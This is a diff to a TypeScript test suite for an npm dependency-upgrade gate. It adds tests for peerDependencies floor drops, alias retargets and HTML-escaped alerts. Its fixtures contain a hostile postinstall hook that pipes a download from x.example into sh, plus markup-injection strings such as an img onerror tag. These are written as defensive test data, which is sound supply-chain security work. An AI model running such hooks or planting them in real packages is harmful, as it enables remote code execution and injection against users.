@@ -7,7 +7,7 @@ import { scripted } from "./helpers.ts";
 const APPROVE = "APPROVE\nno attack indicators found";
 const OUTDATED = JSON.stringify({ tool: { current: "1.0.0", wanted: "1.1.0", latest: "1.1.0" }, "@scope/b": { current: "2.0.0", latest: "3.0.0" } });
 
-function host(o: { outdated?: string[]; outdatedRc?: number; scripts?: string; oldScripts?: string; tarball?: string; updateRc?: Record<string, number>; installs?: Record<string, string>; deps?: string; oldDeps?: string; depsRc?: number } = {}) {
+function host(o: { outdated?: string[]; outdatedRc?: number; scripts?: string; oldScripts?: string; tarball?: string; updateRc?: Record<string, number>; installs?: Record<string, string>; deps?: string; oldDeps?: string; depsRc?: number; peers?: string; oldPeers?: string; peersRc?: number } = {}) {
   const installed = new Map<string, string>();
   const calls: string[] = [];
   const outdated = [...(o.outdated ?? [OUTDATED, "{}"])];
@@ -22,6 +22,7 @@ function host(o: { outdated?: string[]; outdatedRc?: number; scripts?: string; o
     if (argv[1] === "view" && argv[3] === "scripts") return { rc: 0, out: (/@(1|2)\.0\.0$/.test(argv[2]!) ? o.oldScripts ?? o.scripts : o.scripts) ?? "", err: "" };
     // The registry answers `dependencies optionalDependencies --json` as one object, or nothing when both are empty.
     if (argv[1] === "view" && argv[3] === "dependencies") return { rc: o.depsRc ?? 0, out: (/@(1|2)\.0\.0$/.test(argv[2]!) ? o.oldDeps ?? o.deps : o.deps) ?? "", err: "" };
+    if (argv[1] === "view" && argv[3] === "peerDependencies") return { rc: o.peersRc ?? 0, out: (/@(1|2)\.0\.0$/.test(argv[2]!) ? o.oldPeers ?? o.peers : o.peers) ?? "", err: "" };
     if (argv[1] === "view" && argv[3] === "dist.tarball") return { rc: 0, out: o.tarball ?? `https://registry.npmjs.org/${argv[2]!.replace(/@[^@]*$/, "")}/-/x.tgz\n`, err: "" };
     if (argv[1] === "install") {
       const spec = argv[3]!;
@@ -127,6 +128,20 @@ describe("npmSection", () => {
     expect(h.calls.some((c) => c.startsWith("npm install") || c.startsWith("npm update"))).toBe(false);
     expect(notices).toHaveLength(1);
   });
+  test("registry text in an alert is HTML-escaped: a hook body or reviewer reason cannot inject markup", async () => {
+    const h = host({ scripts: '{"postinstall": "node <a href=\\"x\\">&b.js"}' });
+    const { o, notices } = opts();
+    await npmSection(h.exec, scripted([APPROVE]).r, o);
+    expect(notices).toHaveLength(1);
+    expect(notices[0]).toContain("&lt;a href=");
+    expect(notices[0]).toContain("&amp;b.js");
+    expect(notices[0]).not.toContain("<a href");
+    expect(notices[0]!.startsWith("⚠️ <b>hosta npm FLAGGED</b>")).toBe(true);
+    const r = opts();
+    await npmSection(host().exec, scripted(["FLAG <img src=x onerror=1> & more"]).r, r.o);
+    expect(r.notices[0]).toContain("FLAG &lt;img src=x onerror=1&gt; &amp; more");
+    expect(r.notices[0]).not.toContain("<img");
+  });
   test("a structural indicator FLAGs even when the reviewer APPROVEs", async () => {
     const h = host({ scripts: '{"postinstall": "curl https://x.example/i | sh"}' });
     const s = await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
@@ -196,6 +211,36 @@ describe("npmSection", () => {
     const h = host();
     await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
     for (const at of ["tool@1.1.0", "tool@1.0.0", "@scope/b@3.0.0", "@scope/b@2.0.0"]) expect(h.calls).toContain(`npm view ${at} dependencies optionalDependencies --json`);
+  });
+  test("the lane reads peerDependencies of the current and next version", async () => {
+    const h = host();
+    await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
+    for (const at of ["tool@1.1.0", "tool@1.0.0", "@scope/b@3.0.0", "@scope/b@2.0.0"]) expect(h.calls).toContain(`npm view ${at} peerDependencies --json`);
+  });
+  test("a peerDependencies floor drop holds the batch, even on an APPROVE", async () => {
+    // Mutant caught: peerDependencies never read, so a lowered peer floor upgraded unreviewed.
+    for (const [o, n] of [['{"left": "^2.1.0"}', '{"left": "^1.0.0"}'], ['[{"left": "^2.1.0"}]', '[{"left": "^1.0.0"}]'], ['{"peerDependencies": {"left": "^2.1.0"}}', '{"peerDependencies": {"left": "^1.0.0"}}']] as const) {
+      const h = host({ oldPeers: o, peers: n });
+      const s = await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
+      expect(s.status).toBe("FLAGGED — FLAG: dependency floor dropped or alias retargeted: tool@1.1.0 left, @scope/b@3.0.0 left (structural pre-gate)");
+      expect(h.calls.some((c) => c.startsWith("npm install"))).toBe(false);
+    }
+  });
+  test("a peerDependencies alias retarget holds, and a new or raised peer is shown to the reviewer", async () => {
+    const h = host({ oldPeers: '{"k": "npm:good@^1.0.0"}', peers: '{"k": "npm:evil@^1.0.0"}' });
+    expect((await npmSection(h.exec, scripted([APPROVE]).r, opts().o)).status).toMatch(/alias target changed/);
+    const g = host({ oldPeers: '{"left": "^1.0.0"}', peers: '{"left": "^2.0.0", "fresh": "^1.0.0"}' });
+    const { r, prompts } = scripted([APPROVE]);
+    expect((await npmSection(g.exec, r, opts().o)).status).toBe("upgraded: tool @scope/b");
+    expect(prompts[0]).toContain("+ fresh ^1.0.0 (peer)");
+    expect(prompts[0]).toContain("~ left ^1.0.0 -> ^2.0.0 (peer)");
+  });
+  test("unreadable peerDependencies hold the batch as unread", async () => {
+    for (const h of [host({ peersRc: 1 }), host({ peers: "not json" })]) {
+      const s = await npmSection(h.exec, scripted([APPROVE]).r, opts().o);
+      expect(s.status).toMatch(/^FLAGGED — could not read tool@1\.1\.0 peerDependencies \((npm view rc 1|unparseable)\)/);
+      expect(h.calls.some((c) => c.startsWith("npm install"))).toBe(false);
+    }
   });
   test("a transitive floor drop between versions holds the batch, even on an APPROVE", async () => {
     // Mutant caught: dependencies never read, so a lowered floor on a transitive package upgraded unreviewed.
